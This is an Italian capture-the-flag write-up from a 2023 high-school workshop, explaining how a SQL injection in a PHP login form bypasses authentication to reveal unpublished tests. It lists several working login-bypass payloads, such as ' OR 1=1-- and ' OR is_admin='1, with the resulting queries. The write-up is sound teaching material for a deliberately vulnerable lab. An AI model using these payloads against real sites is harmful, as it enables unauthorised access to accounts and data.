# 4th HighSchools CTF Workshop - Perugia 2023

## [web] Trova le soluzioni 3

Il sito è scritto in PHP ed utilizza un database MySQL per gestire gli utenti e le verifiche.  
Le verifiche non pubblicate possono essere visualizzate soltanto dagli utenti con privilegi di amministratore.

## Vulnerabilità

### SQL Injection

L'SQL Injection è una vulnerabilità che permette di eseguire codice SQL arbitrario all'interno di una query.  
In questo caso specifico l'SQL Injection può essere sfruttata per bypassare il controllo di autenticazione e visualizzare le verifiche non pubblicate.

## Soluzione

Il form di login è vulnerabile ad un attacco di tipo `SQL Injection`.  
Inserendo come username "`'`" verrà creata un'eccezione SQL che, per semplicità, verrà visualizzata a schermo in fase di errore:

<pre>
SELECT * FROM users WHERE password = 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' AND name = '<span style="color: red;">'</span>'
</pre>

Questo avviene perché il parametro `name` non viene filtrato e viene concatenato direttamente alla query SQL.  
Come si può constatare l'username viene inserito direttamente tra i due apici singoli (<code>SELECT \* FROM users WHERE password = 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' AND name = '<span style="color: red;">'</span>'</code>), pertanto inserendo "`'`" si chiuderà il primo apice singolo e si aprirà il secondo (che non viene chiuso), generando un'eccezione SQL.

Per sfruttare questa vulnerabilità è sufficiente injectare una chiusura dell'apice e manipolare la condizione `WHERE` per ottenere il risultato desiderato.  
In questo caso la tabella `users` contiene soltanto un utente, quindi basta inserire una condizione che sia sempre vera (es `1=1` oppure `'ciao'='ciao'`) per ottenere l'accesso.

Inserendo come username "`' OR 'ciao'='ciao`" verrà costruita la seguente query SQL:

<pre>
SELECT * FROM users WHERE password = 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' AND name = '<span style="color: red;">' OR 'ciao'='ciao</span>'
</pre>

Altri esempi validi di injection sono

<pre>
SELECT * FROM users WHERE password = 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' AND name = '<span style="color: red;">' OR 1=1-- Commento :)</span>'
</pre>
<pre>
SELECT * FROM users WHERE password = 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' AND name = '<span style="color: red;">' OR 1=1# Commento :)</span>'
</pre>
<pre>
SELECT * FROM users WHERE password = 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' AND name = '<span style="color: red;">' OR ''='</span>'
</pre>

Con questo esempio si può filtrare invece la tabella per selezionare soltanto gli utenti con privilegi di amministratore, questo sarebbe stato utile nel caso in cui il primo utente non fosse stato un admin:

<pre>
SELECT * FROM users WHERE password = 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' AND name = '<span style="color: red;">' OR is_admin='1</span>'
</pre>

Una volta ottenuto l'accesso si potrà visualizzare la flag cliccando sul link di una delle verifiche non pubblicate presenti nella pagina.
